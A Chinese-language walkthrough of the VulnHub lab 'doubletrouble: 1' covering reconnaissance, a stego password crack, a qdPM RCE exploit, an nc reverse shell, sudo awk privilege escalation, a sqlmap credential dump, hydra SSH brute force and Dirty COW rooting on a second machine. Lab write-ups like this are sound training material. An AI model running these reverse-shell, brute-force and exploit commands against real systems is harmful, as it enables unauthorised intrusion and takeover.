# 复盘*

## 靶机地址

[doubletrouble: 1 ~ VulnHub](https://www.vulnhub.com/entry/doubletrouble-1,743/)

![image-20250315040429903](assets/image-20250315040429903.png)



## 信息收集



### nmap扫描

#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250315043955576](assets/image-20250315043955576.png)





#### nmap三次扫描（端口扫描，详细结果扫描，udp扫描）

##### 利用脚本扫描

```
#!/bin/bash
dir="./nmapscan/"
if [ ! -d $dir ];then
        mkdir -p $dir
fi
target=$1
portscan(){
        nmap -sT --min-rate 10000 -p- $target -oA ${dir}ports > /dev/null 2>&1
}
portscan
ports=$(cat ${dir}ports.nmap | grep open | awk -F / '{print $1}' | paste -sd,)
detailscan(){
        nmap -sC -sV -sT -Pn -O -p $ports $target -oA ${dir}detail > /dev/null 2>&1
}
udpscan(){
        nmap -sU --top-ports 20 $target -oA ${dir}udp > /dev/null 2>&1
}
detailscan
udpscan
cat ${dir}detail.nmap
cat ${dir}udp.nmap

```

![image-20250315042952649](assets/image-20250315042952649.png)

- 定义扫描结果存放路径：当前路径下的nmapscan

- 如果不存在该路径则创建
- 定义target用来接收ip
- 定义端口扫描函数，且不输出扫描结果
- 执行扫描
- 提取扫描结果中的端口信息
- 定义详细结果扫描函数，不输出信息
- 定义udp扫描函数
- 执行详细结果扫描并查看扫描结果





##### 移动目录

```
sudo mv scan /usr/local/bin
```

![image-20250315043417577](assets/image-20250315043417577.png)





##### 修改权限

```
sudo chmd 777 /usr/local/bin/scan
```

![image-20250315043849899](assets/image-20250315043849899.png)





##### 执行扫描

##### 详细结果扫描

```
scan 192.168.1.12
```

![image-20250315043926736](assets/image-20250315043926736.png)

分析：

- 22 ssh服务 OpenSSH 7.9p1
- 80 htp Apache httpd 2.4.38
- qdPM CMS





### 80 端口

#### 访问192.168.1.12

![image-20250315044327444](assets/image-20250315044327444.png)

登陆界面

用户名为邮箱地址（很难爆破）

查看源码，无信息

但是下面提示了qdPM 9.1





#### 搜索相关漏洞

```
sudo searchsploit qdPM 9.1
```

![image-20250315045537668](assets/image-20250315045537668.png)

存在rce





#### 下载脚本

```
sudo searchsploit -m php/webapps/50944.py
```

![image-20250315045606648](assets/image-20250315045606648.png)

![image-20250315045645289](assets/image-20250315045645289.png)

![image-20250315045855066](assets/image-20250315045855066.png)

需要提供参数，用户名，密码

其中用户名任意权限的都可以

但是没有注册页面





#### dirsearch扫描目录

```
dirsearch -u 192.168.1.12
```

![image-20250315044554658](assets/image-20250315044554658.png)

![image-20250315044602146](assets/image-20250315044602146.png)

分析：

- backups
- images
- readme.txt
- robots.txt
- secret
- uploads



逐个访问

![image-20250315044702351](assets/image-20250315044702351.png)

无内容



图标信息

![image-20250315044730563](assets/image-20250315044730563.png)

![image-20250315044828192](assets/image-20250315044828192.png)

指明为qdPMCMS

![image-20250315044859853](assets/image-20250315044859853.png)

无内容

![image-20250315044926187](assets/image-20250315044926187.png)

存在doubletrouble.jpg

![image-20250315044949191](assets/image-20250315044949191.png)

![image-20250315045031694](assets/image-20250315045031694.png)

无内容





#### 下载图片

```
wget http://192.168.1.12/secret/doubletrouble.jpg
```





#### steghide检测是否存在隐写

```
steghide info doubletrouble.jpg
```

![image-20250315045114081](assets/image-20250315045114081.png)

存在隐写数据





#### 利用stegseek爆破

https://github.com/RickdeJager/stegseek

```
stegseek -sf doubletrouble.jpg -wl /usr/share/wordlists/rockyou.txt
```

![image-20250315045154514](assets/image-20250315045154514.png)

得到密码92camaro





#### steghide提取数据

```
steghide extract -sf doubletrouble.jpg -p 92camaro
```

![image-20250315045248794](assets/image-20250315045248794.png)

```
cat creds.txt
```

![image-20250315045304109](assets/image-20250315045304109.png)

得到用户名和密码





#### 利用exp

```
python 50944.py -url http://192.168.1.12/ -u otisrush@localhost.com -p otis666
```

![image-20250315050210949](assets/image-20250315050210949.png)

给出后门地址

直接访问

![image-20250315050240984](assets/image-20250315050240984.png)





#### 反弹shell

```
which nc
```

![image-20250315050300624](assets/image-20250315050300624.png)

```
nc -lvp
```

![image-20250315050414879](assets/image-20250315050414879.png)

```
cmd=nc -e /bin/bash 192.168.1.3 283
```

![image-20250315050347634](assets/image-20250315050347634.png)

![image-20250315050426418](assets/image-20250315050426418.png)

成功弹回shell





#### python转换终端

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20250315051103647](assets/image-20250315051103647.png)





## 提权

### 查看/etc/passwd

```
cat /etc/passwd
```

![image-20250315050614157](assets/image-20250315050614157.png)





### suid位查找

```
find / -user root -perm -4000 2>/dev/null
```

![image-20250315050829801](assets/image-20250315050829801.png)





### 执行sudo -l

```
sudo -l
```

![image-20250315050940810](assets/image-20250315050940810.png)

无密码执行awk





### awk提权

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

![image-20250315051156271](assets/image-20250315051156271.png)





### 成功提权

```
cd /root
ls
```

![image-20250315051326174](assets/image-20250315051326174.png)





发现还有一台机器

### 拷贝机器到web服务器

```
cp doubletrouble.ova /var/www/html
```



![image-20250315051555008](assets/image-20250315051555008.png)



### 赋予权限

```
ls -al /var/www/html
chmod 777 /var/www/html/doubletrouble.ova
```

![image-20250315051616666](assets/image-20250315051616666.png)





### 浏览器下载

![image-20250315051542999](assets/image-20250315051542999.png)

（但是后续我导入虚拟机的时候报错，应该是文件损坏）





### 尝试通过scp互传文件

```
scp doubletrouble.ova ra1n3@192.168.1.3:/home/ra1n3/tmp/
```

![image-20250315052222278](assets/image-20250315052222278.png)





## 信息收集

### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250315052434234](assets/image-20250315052434234.png)

确定第二台靶机ip

192.168.1.11





### nmap扫描

#### 详细扫描结果

![image-20250315052503176](assets/image-20250315052503176.png)

分析 

- 22 ssh  OpenSSH 6.0p1 
- 80 http Apache httpd





#### udp扫描结果



![image-20250315052530862](assets/image-20250315052530862.png)





### 八零端口

#### 访问192.168.1.11

![image-20250315052634511](assets/image-20250315052634511.png)

查看源码，无发现





#### 尝试sqlmap

抓包

![image-20250315052816148](assets/image-20250315052816148.png)

保存到sql文件夹

尝试读取数据库

```
sqlmap -l sql --batch --dbs
```

![image-20250315052916066](assets/image-20250315052916066.png)

![image-20250315052926710](assets/image-20250315052926710.png)

得到两个数据库

尝试读取表

```
sqlmap -l sql --batch -D doubletrouble --tables
```

![image-20250315053017176](assets/image-20250315053017176.png)

![image-20250315053022585](assets/image-20250315053022585.png)



尝试读取字段名

```
sqlmap -l sql --batch -D doubletrouble -T users --columns
```

![image-20250315053053070](assets/image-20250315053053070.png)

![image-20250315053059397](assets/image-20250315053059397.png)

提取字段数据

```
sqlmap -l sql --batch -D doubletrouble -T users -C "username,password" --dump
```

![image-20250315053139964](assets/image-20250315053139964.png)

![image-20250315053144765](assets/image-20250315053144765.png)







#### 处理数据，制作字典

```
cat /home/ra1n3/.local/share/sqlmap/output/192.168.1.11/dump/doubletrouble/users.csv | tail -n +2 | sed  's/,/\n/' > user.txt
```

![image-20250315053711842](assets/image-20250315053711842.png)







### 22 端口

#### hydra爆破ssh

```
hydra -L user.txt -P user.txt ssh://192.168.1.11
```

![image-20250315053736040](assets/image-20250315053736040.png)







#### ssh登录

![image-20250315053806372](assets/image-20250315053806372.png)







## 提权

### 得到第一个flag

```
ls
cat user.txt
```

![image-20250315054251784](assets/image-20250315054251784.png)





### 执行sudo -l

```
sudo -l
```

![image-20250315053821706](assets/image-20250315053821706.png)





### suid查找

```
find / -user root -perm -4000 2>/dev/null
```

![image-20250315053854591](assets/image-20250315053854591.png)

exim4







### 查看版本信息

```
/usr/sbin/exim4 -v
```

![image-20250315054107138](assets/image-20250315054107138.png)

4.80





### 搜索相关漏洞

```
sudo searchsploit exim 4.8
```

![image-20250315054137442](assets/image-20250315054137442.png)

没有合适的提权漏洞







### 上传les.sh

```
wget 192.168.1.3/les.sh
```

![image-20250315054347335](assets/image-20250315054347335.png)





### 执行les.sh

![image-20250315054402982](assets/image-20250315054402982.png)

### 尝试脏牛提权



#### 靶机中wget下载失败

```
wget https://www.exploit-db.com/download/40839
```

![image-20250315054627662](assets/image-20250315054627662.png)





#### windows下载然后scp拷贝

```
scp 40839.c clapton@192.168.1.11:/home/clapton
```

![image-20250315054649291](assets/image-20250315054649291.png)

![image-20250315054653809](assets/image-20250315054653809.png)







#### 查看exp

```
cat 40839.c
```

![image-20250315054743163](assets/image-20250315054743163.png)

也就是该程序执行时需要欸他一个新的密码，然后创建用户名为firefart的rot用户，运行后成功，可以切换到该用户





#### 编译

```
gcc -pthread 40839.c -o dirty -lcrypt
```

![image-20250315055447563](assets/image-20250315055447563.png)

```
./dirty
su firefart
```

![image-20250315055458522](assets/image-20250315055458522.png)





#### 得到第二个flag

```
cd /root
ls
cat root.txt
```

![image-20250315055554143](assets/image-20250315055554143.png)